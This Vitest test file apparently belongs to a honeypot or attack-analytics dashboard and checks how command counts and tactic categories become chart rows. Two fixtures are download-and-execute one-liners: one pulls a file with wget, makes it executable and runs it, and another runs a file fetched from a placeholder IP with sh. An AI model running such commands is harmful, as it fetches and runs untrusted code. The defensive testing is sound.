import { describe, expect, it } from 'vitest'

import type {
  CommandTacticResponse,
  TopCommandLineResponse,
  TopCommandResponse,
} from '@/api/generated/types.gen'
import {
  TACTIC_LABELS,
  buildCommandLineRows,
  buildCommandRows,
  buildTacticRows,
} from '@/utils/commands'

describe('buildCommandRows', () => {
  it('ranks bar width by share of the max count', () => {
    const items: TopCommandResponse[] = [
      { command: 'uname', count: 80 },
      { command: 'wget', count: 20 },
    ]
    const rows = buildCommandRows(items)
    expect(rows[0]!.label).toBe('uname')
    expect(rows[0]!.widthPct).toBe('100%')
    expect(rows[1]!.widthPct).toBe('25%')
    expect(rows[0]!.title).toContain('80')
  })

  it('labels an empty executable bucket', () => {
    const rows = buildCommandRows([{ command: '', count: 3 }])
    expect(rows[0]!.label).toBe('‹empty›')
  })

  it('escapes control characters in a command label', () => {
    const rows = buildCommandRows([{ command: 'ls' + String.fromCharCode(7), count: 1 }])
    expect(rows[0]!.label).toBe('ls\\x07')
  })
})

describe('buildTacticRows', () => {
  it('maps tactic keys to human labels', () => {
    const items: CommandTacticResponse[] = [
      { name: 'recon', count: 10 },
      { name: 'download', count: 4 },
    ]
    const rows = buildTacticRows(items)
    expect(rows.map((r) => r.label)).toEqual(['Recon', 'Download'])
    expect(rows[0]!.widthPct).toBe('100%')
  })

  it('falls back to the raw key for an unknown tactic', () => {
    const rows = buildTacticRows([{ name: 'mystery', count: 1 }])
    expect(rows[0]!.label).toBe('mystery')
  })

  it('exposes a label for every tactic bucket', () => {
    const keys = ['recon', 'download', 'execute', 'persist', 'destroy', 'shell', 'other']
    for (const key of keys) expect(TACTIC_LABELS[key]).toBeTruthy()
  })
})

describe('buildCommandLineRows', () => {
  it('keeps the verbatim one-liner as both the label and the tooltip', () => {
    const items: TopCommandLineResponse[] = [
      { input: 'cd /tmp; wget http://x/y; chmod 777 y', count: 7 },
    ]
    const rows = buildCommandLineRows(items)
    expect(rows[0]!.label).toContain('chmod 777 y')
    expect(rows[0]!.title).toBe(rows[0]!.label)
    expect(rows[0]!.count).toBe(7)
  })

  it('blots an IP literal that survived into a one-liner (defense in depth)', () => {
    const rows = buildCommandLineRows([{ input: 'wget http://203.0.113.9/x; sh x', count: 1 }])
    expect(rows[0]!.label).toContain('‹ip›')
    expect(rows[0]!.label).not.toContain('203.0.113.9')
  })
})
